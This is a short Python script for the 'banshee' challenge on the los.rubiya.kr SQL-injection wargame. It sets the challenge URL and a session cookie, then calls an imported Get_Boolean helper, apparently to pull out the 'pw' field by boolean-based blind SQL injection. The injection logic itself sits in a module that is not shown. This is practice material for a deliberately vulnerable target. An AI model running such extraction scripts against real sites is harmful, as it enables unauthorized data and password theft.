import string
import requests
import time
from Get_Method import *
url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php"
session = requests.Session()
char = string.printable
header = {
    'Cookie' : "PHPSESSID=ogqa1076r03o7bdovv94aducp4"
}


Get_Boolean(url , header , "pw")
